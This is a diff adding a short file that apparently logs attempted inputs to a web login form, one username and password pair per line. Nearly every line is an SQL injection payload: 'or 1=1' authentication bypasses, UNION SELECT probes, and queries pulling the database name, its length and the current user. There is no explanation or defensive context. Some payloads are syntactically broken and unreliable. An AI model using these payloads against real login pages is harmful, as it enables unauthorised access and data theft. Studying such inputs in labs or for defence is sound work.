@@ -1,0 +1,30 @@
+User Name:1Password:
+User Name:1' or 1=1 --+Password:
+User Name:1' or 1=1 Password:--+
+User Name:1' or 1=1Password:
+User Name:Password:1' or 1=1 --+
+User Name:1' or 1=1Password:1' or 1=1 --+
+User Name:adminPassword:123456
+User Name:adminPassword:123456
+User Name:1Password:
+User Name:1' or 1=1 --+Password:
+User Name:1' or 1=1 --+Password:
+User Name:Password:1' or 1=1 --+
+User Name:1Password:
+User Name:1' or 1=1Password:
+User Name:1 and 1=1Password:
+User Name:1" or 1=1 --+Password:
+User Name:1' or 1=1 --+Password:dasf
+User Name:Password:1' or 1=1 --+
+User Name:Password:1' or 1=1 #
+User Name:Password:1' union select 1,1,1 #
+User Name:Password:1' or 1=1 #
+User Name:Password:1' or length(database())=8 #
+User Name:Password:1' or 1=2 #
+User Name:Password:1' or 1=1 #
+User Name:Password:1' union select 1,1 #
+User Name:Password:1' or select database(),user() #
+User Name:Password:1' or select database(),user() #
+User Name:Password:1' or union select database(),user() #
+User Name:Password:1' union select 1,1 #
+User Name:Password:2' union select database(),user() #
